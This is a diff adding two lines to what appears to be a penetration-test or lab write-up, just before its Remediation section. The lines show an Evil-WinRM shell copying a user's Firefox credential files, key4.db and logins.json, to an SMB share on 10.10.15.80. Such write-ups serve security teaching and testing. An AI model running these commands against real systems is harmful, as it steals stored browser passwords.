@@ -1017,6 +1017,11 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 
 ```
 
+```
+*Evil-WinRM* PS C:\Users\nikk37\Appdata\roaming\mozilla\Firefox\Profiles\br53rxeg.default-release> copy key4.db \\10.10.15.80\share\
+*Evil-WinRM* PS C:\Users\nikk37\Appdata\roaming\mozilla\Firefox\Profiles\br53rxeg.default-release> copy logins.json \\10.10.15.80\share\
+```
+
 ---
 ## Remediation
 
